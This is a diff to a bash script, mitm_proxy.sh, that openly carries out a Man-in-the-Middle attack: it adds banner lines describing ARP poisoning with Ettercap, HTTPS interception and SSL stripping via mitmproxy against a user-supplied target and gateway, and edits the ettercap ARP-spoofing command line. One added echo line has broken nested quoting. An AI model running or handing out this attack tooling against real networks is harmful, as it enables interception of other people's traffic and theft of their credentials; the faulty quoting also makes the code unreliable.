@@ -18,6 +18,17 @@ YELLOW='\033[1;33m'
 BLUE='\033[0;34m'
 NC='\033[0m'  # No Color
 
+echo -e "${GREEN} [*] --------------------------------------------------------------------------------------------------------------------------------------------------------------"
+echo -e "${YELLOW}[*]  #1. This script mitm_proxy.sh is designed for a Man-in-the-Middle (MITM) attack using Ettercap and mitmproxy. Here's a breakdown of what the script does: ${\n}"
+echo -e "${YELLOW}[*]  #2. echo -e "${BLUE}[*] " Color Variables: Defines color variables for text output."
+echo -e "${YELLOW}[*]  #3. Package Installation & Setup: Installs required packages (ettercap-common, ettercap-graphical, and mitmproxy) and starts mitmproxy in transparent mode."
+echo -e "${YELLOW}[*]  #4. IP Forwarding: Enables IP forwarding on the system."
+echo -e "${YELLOW}[*]  #5. User Input: Prompts the user for the Gateway IP, Target IP, and network interface."
+echo -e "${YELLOW}[*]  #6. Compile Ettercap Filter: Compiles the Ettercap filter and runs Ettercap with the provided network parameters."
+echo -e "${YELLOW}[*]  #7. HTTPS/SSL Stripping: Runs mitmproxy and Ettercap for HTTPS interception."
+echo -e "${YELLOW}[*]  #8. Clean Up: Disables IP forwarding and removes temporary logs."
+echo -e "${GREEN} [*] --------------------------------------------------------------------------------------------------------------------------------------------------------------"
+
 # ---------------------------
 # 1. Package Installation & Setup
 # ---------------------------
@@ -47,7 +58,7 @@ echo -e "${BLUE}[*] Compiling Ettercap filter...${NC}"
 sudo etterfilter proxy_filter.ef -o proxy_filter.efilter
 
 echo -e "${BLUE}[*] Running Ettercap (first run)...${NC}"
-sudo ettercap -T -q -i "$INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//
+sudo ettercap -T -q -i "$MY_INTERFACE" -F proxy_filter.efilter -M arp:remote /${GATEWAY_IP}// /${TARGET_IP}//
 
 # (Optional) Uncomment the following block to recompile and run Ettercap a second time
 #: <<'OPTIONAL'
